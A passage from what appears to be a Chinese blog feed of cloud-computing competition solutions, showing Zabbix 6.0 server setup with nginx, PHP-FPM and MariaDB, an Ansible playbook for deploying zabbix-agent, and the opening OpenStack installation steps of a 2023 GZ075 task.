class="line">Mar 18 04:52:20 zabbix_server systemd[1]: Started MariaDB data...</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br></pre></td></tr></table></figure>



<p>⑦登录mysql,创建数据库zabbix和用户zabbix密码自定义，并授权zabbix用户拥有zabbix数据库的所有权限。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mysql -uroot -p</span></span><br><span class="line">MariaDB [(none)]&gt; create database zabbix charset utf8 collate utf8_bin;;</span><br><span class="line">MariaDB [(none)]&gt; grant all privileges on zabbix.* to zabbix@localhost identified by &#x27;password&#x27;;</span><br><span class="line">MariaDB [zabbix]&gt; show grants for &#x27;zabbix&#x27;@&#x27;localhost&#x27;;</span><br><span class="line">+---------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Grants for zabbix@localhost                                                                                   |</span><br><span class="line">+---------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| GRANT USAGE ON *.* TO &#x27;zabbix&#x27;@&#x27;localhost&#x27; IDENTIFIED BY PASSWORD &#x27;*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19&#x27; |</span><br><span class="line">| GRANT ALL PRIVILEGES ON `zabbix`.* TO &#x27;zabbix&#x27;@&#x27;localhost&#x27;</span><br></pre></td></tr></table></figure>



<p>⑧分别导入数据库架构及数据，对应的文件分别为schema.sql、images.sql和data.sql（文件顺便不能乱）。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">导入zabbix SQL</span></span><br><span class="line">[root@zabbix-server ~]# zcat /usr/share/doc/zabbix-server-mysql-4.0.24/create.sql.gz | mysql -uroot -p123456 zabbix</span><br></pre></td></tr></table></figure>



<p>⑨配置default.conf。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/default.conf</span><br><span class="line">修改内容如下</span><br><span class="line">root /usr/share/zabbix/;</span><br><span class="line">index index.php index.html index.htm;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span> /etc/nginx/conf.d/default.conf</span></span><br><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">server_name localhost;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">access_log /var/log/nginx/host.access.log main;</span></span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">root /usr/share/zabbix/;</span><br><span class="line">index index.php index.html index.htm;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">error_page 404 /404.html;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">redirect server error pages to the static page /50x.html</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">error_page 500 502 503 504 /50x.html;</span></span><br><span class="line">location = /50x.html &#123;</span><br><span class="line">root /usr/share/nginx/html;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">proxy the PHP scripts to Apache listening on 127.0.0.1:80</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#location ~ \.php$ &#123;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">proxy_pass http://127.0.0.1;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">&#125;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">location ~ \.php$ &#123;</span></span><br><span class="line">	root /usr/share/zabbix;</span><br><span class="line">	fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">	fastcgi_index index.php;</span><br><span class="line">	fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">	include fastcgi_params;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deny access to .htaccess files, <span class="keyword">if</span> Apache<span class="string">&#x27;s document root</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">concurs with nginx&#x27;</span>s one</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#location ~ /\.ht &#123;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deny all;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>⑩分别修改配置文件zabbix_server.conf(修改数据库密码)和zabbix_agentd.conf（修改服务器IP，活动服务器IP和主机名），并重启对应服务使配置生效。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix_server ~]# vim /etc/zabbix_server.conf</span><br><span class="line">DBName=zabbix</span><br><span class="line">DBUser=zabbix</span><br><span class="line">DBPassword=password</span><br><span class="line">[root@zabbix_server ~]# vim /etc/zabbix_agentd.conf</span><br><span class="line">Server=192.168.157.40</span><br><span class="line">ServerActive=192.168.157.40</span><br><span class="line">Hostname=zabbix_server</span><br><span class="line">[root@zabbix_server ~]# cat /etc/zabbix_agentd.conf | grep -v &#x27;^#\|^$&#x27;</span><br><span class="line">PidFile=/run/zabbix/zabbix_agentd.pid</span><br><span class="line">LogFile=/var/log/zabbix/zabbix_agentd.log</span><br><span class="line">LogFileSize=0</span><br><span class="line">Server=192.168.100.91</span><br><span class="line">ServerActive=192.168.100.91</span><br><span class="line">Hostname=zabbix_server</span><br><span class="line">[root@master ~]# systemctl restart zabbix-server</span><br><span class="line">[root@master ~]# systemctl restart zabbix-agent</span><br></pre></td></tr></table></figure>



<p>11修改php.ini文件,其中最大POST数据限制为16M,程序执行时间限制为300，PHP页面接受数据所需最大时间限制为300，把时区设为Asia&#x2F;Shanghai,并重启相关服务。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix_server ~]# vim /etc/php.ini</span><br><span class="line">post_max_size = 16M</span><br><span class="line">max_execution_time = 300</span><br><span class="line">max_input_time = 300</span><br><span class="line">date.timezone = Asia/Shanghai</span><br><span class="line">[root@zabbix_server ~]# systemctl restart php74-php-fpm</span><br></pre></td></tr></table></figure>



<p>12修改<a href="http://www.conf/">www.conf</a>文件,把用户和组都设置为nginx.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> [root@zabbix_server ~]# vim /etc/php-fpm.d/www.conf</span><br><span class="line">user = nginx</span><br><span class="line">group = nginx</span><br><span class="line">[root@zabbix_server ~]# cat /etc/php-fpm.d/www.conf | grep -v &#x27;^;\|^$&#x27;</span><br><span class="line">[www]</span><br><span class="line">listen = 127.0.0.1:9000</span><br><span class="line"> </span><br><span class="line">listen.allowed_clients = 127.0.0.1</span><br><span class="line">user = nginx</span><br><span class="line">group = nginx</span><br><span class="line">pm = dynamic</span><br><span class="line">pm.max_children = 50</span><br><span class="line">pm.start_servers = 5</span><br><span class="line">pm.min_spare_servers = 5</span><br><span class="line">pm.max_spare_servers = 35</span><br><span class="line">slowlog = /var/log/php-fpm/www-slow.log</span><br><span class="line">php_admin_value[error_log] = /var/log/php-fpm/www-error.log</span><br><span class="line">php_admin_flag[log_errors] = on</span><br><span class="line">php_value[session.save_handler] = files</span><br><span class="line">php_value[session.save_path] = /var/lib/php/session</span><br></pre></td></tr></table></figure>





<p>13修改zabbix.conf文件,把用户和组都设置为nginx,并将index.php所在的目录和php.ini文件拥有者和用户组改为nginx。重启相关服务，在浏览器中输入http:&#x2F;&#x2F;公网IP&#x2F; setup.php即可看到zabbix 6.0界面。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/php-fpm.d/zabbix.conf</span><br><span class="line">[zabbix]</span><br><span class="line">user = nginx</span><br><span class="line">group = nginx</span><br><span class="line">[root@zabbix_server ~]# chown -R nginx:nginx /usr/share/zabbix/</span><br><span class="line">[root@zabbix_server ~]# chown -R nginx:nginx /etc/opt/remi/php74/php.ini</span><br><span class="line">[root@zabbix_server ~]# chmod +x /usr/share/zabbix</span><br><span class="line">[root@zabbix_server ~]# systemctl restart nginx</span><br><span class="line">[root@zabbix_server ~]# systemctl restart zabbix-server</span><br><span class="line">[root@zabbix_server ~]# systemctl restart zabbix-agent</span><br><span class="line">[root@zabbix_server ~]# systemctl restart php74-php-fpm </span><br><span class="line">[root@zabbix_server ~]# curl http://123.249.10.60/setup.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">       &lt;head&gt;</span><br><span class="line">              &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;/&gt;</span><br><span class="line">              &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">              &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">              &lt;meta name=&quot;Author&quot; content=&quot;Zabbix SIA&quot; /&gt;</span><br><span class="line">              &lt;title&gt;Installation&lt;/title&gt;</span><br><span class="line">              &lt;link rel=&quot;icon&quot; href=&quot;favicon.ico&quot;&gt;</span><br><span class="line">              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;76x76&quot; href=&quot;assets/img/apple-touch-icon-76x76-precomposed.png&quot;&gt;</span><br><span class="line">              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;120x120&quot; href=&quot;assets/img/apple-touch-icon-120x120-precomposed.png&quot;&gt;</span><br><span class="line">              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;152x152&quot; href=&quot;assets/img/apple-touch-icon-152x152-precomposed.png&quot;&gt;</span><br><span class="line">              &lt;link rel=&quot;apple-touch-icon-precomposed&quot; sizes=&quot;180x180&quot; href=&quot;assets/img/apple-touch-icon-180x180-precomposed.png&quot;&gt;</span><br><span class="line">              &lt;link rel=&quot;icon&quot; sizes=&quot;192x192&quot; href=&quot;assets/img/touch-icon-192x192.png&quot;&gt;</span><br><span class="line">              &lt;meta name=&quot;csrf-token&quot; content=&quot;5d4324e81318a310&quot;/&gt;</span><br><span class="line">              &lt;meta name=&quot;msapplication-TileImage&quot; content=&quot;assets/img/ms-tile-144x144.png&quot;&gt;</span><br><span class="line">              &lt;meta name=&quot;msapplication-TileColor&quot; content=&quot;#d40000&quot;&gt;</span><br><span class="line">              &lt;meta name=&quot;msapplication-config&quot; content=&quot;none&quot;/&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;assets/styles/blue-theme.css?1675235994&quot; /&gt;</span><br><span class="line">&lt;script src=&quot;js/browsers.js?1674462826&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;jsLoader.php?ver=6.0.13&amp;amp;lang=en_US&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;jsLoader.php?ver=6.0.13&amp;amp;lang=en_US&amp;amp;files%5B0%5D=setup.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;div class=&quot;wrapper&quot;&gt;&lt;main&gt;&lt;form method=&quot;post&quot; action=&quot;setup.php&quot; accept-charset=&quot;utf-8&quot; id=&quot;setup-form&quot;&gt;&lt;div class=&quot;setup-container&quot;&gt;&lt;div class=&quot;setup-left&quot;&gt;&lt;div class=&quot;setup-logo&quot;&gt;&lt;div class=&quot;zabbix-logo&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;ul&gt;&lt;li class=&quot;setup-left-current&quot;&gt;Welcome&lt;/li&gt;&lt;li&gt;Check of pre-requisites&lt;/li&gt;&lt;li&gt;Configure DB connection&lt;/li&gt;&lt;li&gt;Settings&lt;/li&gt;&lt;li&gt;Pre-installation summary&lt;/li&gt;&lt;li&gt;Install&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div class=&quot;setup-right&quot;&gt;&lt;div class=&quot;setup-right-body&quot;&gt;&lt;div class=&quot;setup-title&quot;&gt;&lt;span&gt;Welcome to&lt;/span&gt;Zabbix 6.0&lt;/div&gt;&lt;ul class=&quot;table-forms&quot;&gt;&lt;li&gt;&lt;div class=&quot;table-forms-td-left&quot;&gt;&lt;label for=&quot;label-default-lang&quot;&gt;Default language&lt;/label&gt;&lt;/div&gt;&lt;div class=&quot;table-forms-td-right&quot;&gt;&lt;z-select id=&quot;default-lang&quot; value=&quot;en_US&quot; focusable-element-id=&quot;label-default-lang&quot; autofocus=&quot;autofocus&quot; name=&quot;default_lang&quot; data-options=&quot;[&#123;&amp;quot;value&amp;quot;:&amp;quot;en_GB&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;English (en_GB)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;en_US&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;English (en_US)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ca_ES&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Catalan (ca_ES)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;zh_CN&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Chinese (zh_CN)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;cs_CZ&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Czech (cs_CZ)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;fr_FR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;French (fr_FR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;de_DE&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;German (de_DE)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;he_IL&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Hebrew (he_IL)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;it_IT&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Italian (it_IT)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ko_KR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Korean (ko_KR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ja_JP&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Japanese (ja_JP)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;nb_NO&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Norwegian (nb_NO)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;pl_PL&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Polish (pl_PL)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;pt_BR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Portuguese (pt_BR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;pt_PT&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Portuguese (pt_PT)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ro_RO&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Romanian (ro_RO)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;ru_RU&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Russian (ru_RU)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;sk_SK&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Slovak (sk_SK)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;tr_TR&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Turkish (tr_TR)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;uk_UA&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Ukrainian (uk_UA)&amp;quot;&#125;,&#123;&amp;quot;value&amp;quot;:&amp;quot;vi_VN&amp;quot;,&amp;quot;label&amp;quot;:&amp;quot;Vietnamese (vi_VN)&amp;quot;&#125;]&quot; tabindex=&quot;-1&quot;&gt;&lt;/z-select&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;setup-footer&quot;&gt;&lt;div&gt;&lt;button type=&quot;submit&quot; id=&quot;next_1&quot; name=&quot;next[1]&quot; value=&quot;Next step&quot;&gt;Next step&lt;/button&gt;&lt;button type=&quot;submit&quot; id=&quot;back_1&quot; name=&quot;back[1]&quot; value=&quot;Back&quot; class=&quot;btn-alt float-left&quot; disabled=&quot;disabled&quot;&gt;Back&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/form&gt;&lt;div class=&quot;signin-links&quot;&gt;Licensed under &lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; class=&quot;grey link-alt&quot; href=&quot;https://www.zabbix.com/license&quot;&gt;GPL v2&lt;/a&gt;&lt;/div&gt;&lt;/main&gt;&lt;footer role=&quot;contentinfo&quot;&gt;Zabbix 6.0.13. &amp;copy; 2001&amp;ndash;2023, &lt;a class=&quot;grey link-alt&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://www.zabbix.com/&quot;&gt;Zabbix SIA&lt;/a&gt;&lt;/footer&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<p>14随机找一目录，在其下分别创建tasks和file目录，把autoDeployment.tar、编写好的repo文件和zabbix_agentd.conf传至file目录，在tasks目录下编写agent.yaml文件，要求在被监控机能远程部署zabbix-agent服务。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix_server opt]# cat agent.yaml</span><br><span class="line">---</span><br><span class="line">- hosts: agent</span><br><span class="line">  become: true</span><br><span class="line">  tasks:</span><br><span class="line">  - name: copy local.repo</span><br><span class="line">    copy:</span><br><span class="line">      src: local.repo</span><br><span class="line">      dest: /etc/yum.repos.d/local.repo</span><br><span class="line">  - name: Copy autoDeployment.tar</span><br><span class="line">    copy:</span><br><span class="line">      src: autoDeployment.tar</span><br><span class="line">      dest: /opt</span><br><span class="line">  - name: Copy zabbix_agentd.conf file</span><br><span class="line">    copy:</span><br><span class="line">      src: zabbix_agentd.conf</span><br><span class="line">      dest: /etc/zabbix/zabbix_agentd.conf</span><br><span class="line">      owner: zabbix</span><br><span class="line">      group: zabbix</span><br><span class="line">      mode: &#x27;0644&#x27;</span><br><span class="line">  - name: tar autoDeployment.tar</span><br><span class="line">    shell:</span><br><span class="line">      cmd: tar -vxf autoDeployment.tar  -C /opt</span><br><span class="line">  - name: Install Zabbix Agent</span><br><span class="line">    yum:</span><br><span class="line">      name: zabbix-agent</span><br><span class="line">      state: present</span><br><span class="line">  - name: Start and enable Zabbix Agent</span><br><span class="line">    service:</span><br><span class="line">      name: zabbix-agent</span><br><span class="line">      state: started</span><br><span class="line">      enabled: true</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2023年GZ075 云计算应用赛项赛题</title>
    <url>/posts/cc6b9ff2.html</url>
    <content><![CDATA[<h1 id="模块一-私有云（30分）"><a href="#模块一-私有云（30分）" class="headerlink" title="模块一 私有云（30分）"></a><strong>模块一 私有云（30分）</strong></h1><p>企业首先完成私有云平台搭建和运维，私有云平台提供云主机、云网络、云存储等基础架构云服务，并开发自动化运维程序。</p>
<h2 id="任务1-私有云服务搭建（5分）"><a href="#任务1-私有云服务搭建（5分）" class="headerlink" title="任务1 私有云服务搭建（5分）"></a><strong>任务1 私有云服务搭建（5分）</strong></h2><h3 id="1-1-1-基础环境配置"><a href="#1-1-1-基础环境配置" class="headerlink" title="1.1.1 基础环境配置"></a>1.1.1 基础环境配置</h3><p>1.控制节点主机名为controller，设置计算节点主机名为compute；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">控制节点</span></span><br><span class="line">[root@localhost ~]# hostnamectl set-hostname controller</span><br><span class="line">[root@localhost ~]# bash</span><br><span class="line">[root@controller ~]#</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">计算节点</span></span><br><span class="line">[root@localhost ~]# hostnamectl set-hostname compute</span><br><span class="line">[root@localhost ~]# bash</span><br><span class="line">[root@compute ~]#</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>2.hosts文件将IP地址映射为主机名。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">全部节点</span></span><br><span class="line">[root@controller ~]# cat /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">172.129.1.10 controller</span><br><span class="line">172.129.1.11 compute</span><br></pre></td></tr></table></figure>



<p>1.1.2  yum源配置</p>
<p>使用提供的http服务地址，分别设置controller节点和compute节点的yum源文件http.repo。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#因为环境原因 自己上传镜像使用即可,自行挂载使用</span></span></span><br><span class="line">[root@controller ~]# cat /etc/yum.repos.d/local.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[iaas]</span><br><span class="line">name=openstack</span><br><span class="line">baseurl=file:///opt/openstack/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br><span class="line">[root@compute yum.repos.d]# cat /etc/yum.repos.d/fto.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://controller/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[iaas]</span><br><span class="line">name=openstack</span><br><span class="line">baseurl=ftp://controller/openstack/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>1.1.3 配置无秘钥ssh</p>
<p>配置controller节点可以无秘钥访问compute节点。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# ssh-keygen</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa):</span><br><span class="line">Created directory &#x27;/root/.ssh&#x27;.</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:gyXwgY44hJYX3AgT2fexXMrZm2h5PSO7gjKvLkqaUdQ root@controller</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 2048]----+</span><br><span class="line">|.+B.=..          |</span><br><span class="line">|.=.*.= o .       |</span><br><span class="line">|o.ooE * O        |</span><br><span class="line">|o.. .  @ .       |</span><br><span class="line">| ..   . S +      |</span><br><span class="line">| .     + * +     |</span><br><span class="line">|..    o . o o    |</span><br><span class="line">|o+ o . . .       |</span><br><span class="line">|= oo=.  ...      |</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line">[root@controller ~]# ssh-copy-id root@compute</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &quot;/root/.ssh/id_rsa.pub&quot;</span><br><span class="line">The authenticity of host &#x27;compute (172.129.1.11)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:WgjZdcpq8bqsV/iKGbAQHGzRcdjUspMRWZBqg3iXV28.</span><br><span class="line">ECDSA key fingerprint is MD5:fc:3a:85:49:87:63:d6:7f:f4:19:b5:cd:ce:f7:f2:88.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed</span><br><span class="line">/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys</span><br><span class="line">root@compute&#x27;s password:</span><br><span class="line"></span><br><span class="line">Number of key(s) added: 1</span><br><span class="line"></span><br><span class="line">Now try logging into the machine, with:   &quot;ssh &#x27;root@compute&#x27;&quot;</span><br><span class="line">and check to make sure that only the key(s) you wanted were added.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>1.1.4 基础安装</strong></p>
<p>在控制节点和计算节点上分别安装openstack-iaas软件包。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# yum install -y openstack-iaas</span><br></pre></td></tr></table></figure>



<p><strong>1.1.5 数据库安装与调优</strong></p>
<p>在控制节点上使用安装Mariadb、RabbitMQ等服务。并进行相关操作。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-mysql.sh</span><br></pre></td></tr></table></figure>

<p>扩展</p>
<p>数据库调优:</p>
<p>在 controller 节点上使用 iaas-install-mysql.sh 脚本安装 Mariadb、Memcached、RabbitMQ<br>等服务。安装服务完毕后，修改&#x2F;etc&#x2F;my.cnf 文件，完成下列要求：</p>
<p>1.设置数据库支持大小写；<br>2.设置数据库缓存 innodb 表的索引，数据，插入数据时的缓冲为 4G； </p>
<p>3.设置数据库的 log buffer 为 64MB；<br>4.设置数据库的 redo log 大小为 256MB；<br>5.设置数据库的 redo log 文件组为 2。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# vim /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">lower_case_table_names =1   #数据库支持大小写</span><br><span class="line">innodb_buffer_pool_size = 4G  #数据库缓存</span><br><span class="line">innodb_log_buffer_size = 64MB  #设置数据库的log buffer即redo日志缓冲</span><br><span class="line">innodb_log_file_size = 256MB   #设置数据库的redo log即redo日志大小</span><br><span class="line">innodb_log_files_in_group = 2   #数据库的redo log文件组即redo日志的个数配置</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><strong>1.1.6  Keystone服务安装与使用</strong></p>
<p>在控制节点上安装Keystone服务并创建用户。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-keystone.sh</span><br></pre></td></tr></table></figure>



<p><strong>1.1.7 Glance安装与使用</strong></p>
<p>在控制节点上安装Glance 服务。上传镜像至平台，并设置镜像启动的要求参数。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-glance.sh</span><br></pre></td></tr></table></figure>



<p><strong>1.1.8 Nova安装</strong></p>
<p>在控制节点和计算节点上分别安装Nova服务。安装完成后，完成Nova相关配置。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#注意要在安装nova之前安装此脚本</span></span></span><br><span class="line"></span><br><span class="line">[root@controller ~]# iaas-install-placement.sh</span><br><span class="line"></span><br><span class="line">[root@controller ~]# iaas-install-nova-controller.sh</span><br><span class="line"></span><br><span class="line">[root@compute ~]# iaas-install-nova-compute.sh</span><br></pre></td></tr></table></figure>

<p>拓展</p>
<p>安装完成后，请修改 nova 相关配置文件，解决因等待时间过长而导致虚拟机启动超时从而获取不</p>
<p>到 IP 地址而报错失败的问题</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-placement.sh</span><br><span class="line">[root@controller ~]# iaas-install-nova-controller.sh</span><br><span class="line">[root@controller ~]# vim /etc/nova/nova.conf</span><br><span class="line">​</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">vif_plugging_is_fatal=<span class="literal">true</span></span></span><br><span class="line">​</span><br><span class="line">改为</span><br><span class="line">​</span><br><span class="line">vif_plugging_is_fatal=false</span><br><span class="line">​</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启nova-*</span></span><br><span class="line">systemctl restart openstack-nova*</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>1.1.9 Neutron安装</strong></p>
<p>在控制和计算节点上正确安装Neutron服务。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-neutron-controller.sh</span><br><span class="line">[root@compute ~]# iaas-install-neutron-compute.sh</span><br></pre></td></tr></table></figure>



<p>1.1.10 Dashboard安装</p>
<p>在控制节点上安装Dashboard服务。安装完成后，将Dashboard中的 Django数据修改为存储在文件中。</p>
